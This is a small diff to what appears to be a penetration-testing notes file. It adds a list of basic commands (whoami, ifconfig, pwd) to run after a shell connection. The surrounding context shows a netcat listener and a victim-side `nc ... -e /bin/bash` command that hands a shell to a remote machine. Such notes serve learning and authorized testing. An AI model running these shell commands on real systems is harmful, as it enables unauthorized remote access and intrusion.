@@ -755,6 +755,11 @@ After the exploit is successful,
 - Hacker machine: `nc -lvnp 444`
 - Victim machine: `nc <ip address of victim> -e /bin/bash`
 
+- After a connection is established using either method some useful commands to run
+- `whoami`
+- `ifconfig`
+- `pwd`
+
 
 **Payload types**
 
